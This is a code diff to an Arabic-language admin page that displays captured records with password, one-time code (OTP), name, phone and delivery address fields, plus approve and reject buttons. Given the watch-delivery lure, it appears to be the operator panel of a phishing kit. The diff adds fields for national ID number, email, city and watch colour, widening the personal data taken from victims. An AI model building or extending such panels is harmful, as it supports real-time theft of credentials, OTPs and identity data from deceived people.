@@ -492,8 +492,12 @@
       <div class="modal-row"><span class="k">كلمة المرور</span><span class="v" id="mPassword"></span></div>
       <div class="modal-row"><span class="k">OTP</span><span class="v" id="mOtp"></span></div>
       <div class="modal-row"><span class="k">الاسم</span><span class="v" id="mName"></span></div>
+      <div class="modal-row"><span class="k">رقم الهوية</span><span class="v" id="mIdNumber"></span></div>
       <div class="modal-row"><span class="k">رقم الجوال</span><span class="v" id="mPhone"></span></div>
+      <div class="modal-row"><span class="k">البريد الإلكتروني</span><span class="v" id="mEmail"></span></div>
+      <div class="modal-row"><span class="k">المدينة</span><span class="v" id="mCity"></span></div>
       <div class="modal-row"><span class="k">عنوان التوصيل</span><span class="v" id="mAddress"></span></div>
+      <div class="modal-row"><span class="k">لون الساعة</span><span class="v" id="mWatchColor"></span></div>
       <div class="modal-actions">
         <button class="modal-approve" id="modalApproveBtn" type="button">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
@@ -702,8 +706,12 @@
       document.getElementById('mPassword').textContent = r.password || '-';
       document.getElementById('mOtp').textContent = r.otp || '-';
       document.getElementById('mName').textContent = r.name || '-';
+      document.getElementById('mIdNumber').textContent = r.idNumber || '-';
       document.getElementById('mPhone').textContent = r.phone || '-';
+      document.getElementById('mEmail').textContent = r.email || '-';
+      document.getElementById('mCity').textContent = r.city || '-';
       document.getElementById('mAddress').textContent = r.address || '-';
+      document.getElementById('mWatchColor').textContent = r.watchColor || '-';
       var isPending = r.status === 'pending' || !r.status;
       modalApproveBtn.classList.toggle('active', isPending);
       modalRejectBtn.classList.toggle('active', isPending);
